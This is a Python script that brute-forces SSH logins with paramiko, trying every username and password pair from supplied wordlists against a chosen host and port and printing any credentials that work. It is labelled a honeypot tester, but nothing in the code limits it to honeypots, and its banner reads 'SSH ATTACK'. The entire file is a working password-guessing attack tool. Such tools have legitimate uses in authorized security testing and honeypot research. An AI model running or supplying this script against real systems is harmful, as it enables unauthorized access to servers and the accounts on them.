#!/usr/bin/env python

import argparse
import paramiko
import time

try:
    import pyfiglet
    banner = pyfiglet.figlet_format("SSH ATTACK")
except:
    print("Failed to detect pyfiglet.\n")
    banner = "Honeypot Brute-Force Tester"

# Initialize lists for users and passwords
usr_arr = []
pass_arr = []

# Argument parser setup
parser = argparse.ArgumentParser(description="Honeypot Brute-Force Testing Tool")
parser.add_argument("--users", help="Path to the user wordlist (e.g., /path/to/users.txt)", required=True)
parser.add_argument("--passes", help="Path to the password wordlist (e.g., /path/to/passwords.txt)", required=True)
parser.add_argument("--host", help="IP address of the honeypot SSH server", required=True)
parser.add_argument("--port", help="Port of the SSH server (default is 22)", type=int, default=22)
args = parser.parse_args()

# Load wordlists with a specified encoding
try:
    with open(args.users, "r", encoding="ISO-8859-1") as usrs:
        usr_arr = [line.strip() for line in usrs]

    with open(args.passes, "r", encoding="ISO-8859-1") as passwords:
        pass_arr = [line.strip() for line in passwords]
except FileNotFoundError as e:
    print(f"Error: {e}")
    quit()
except UnicodeDecodeError as e:
    print(f"Encoding error while reading file: {e}")
    quit()

# Display banner and information
print(banner)
print(f"Target: {args.host} | Port: {args.port}")
print(f"User wordlist: {args.users} | Password wordlist: {args.passes}\n")

# Brute-force loop
for user in usr_arr:
    for password in pass_arr:
        try:
            # Initialize SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print(f"Trying User: {user} | Password: {password}")

            # Attempt to connect to the honeypot
            client.connect(username=user, hostname=args.host, password=password, port=args.port, timeout=5)

            # If connection is successful, print the credentials and break
            print(f"Success! Credentials found: User={user}, Password={password}\n")
            client.close()
            break  # Exit after a successful login
        except paramiko.ssh_exception.AuthenticationException:
            print("Failed to authenticate. Moving to next credentials...\n")
            time.sleep(0.2)
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("No valid connection could be established. Check the honeypot's IP/Port.\n")
            quit()
        except Exception as e:
            print(f"Unexpected error: {e}\n")
            time.sleep(0.3)
        finally:
            client.close()

print("Brute-force test completed.")
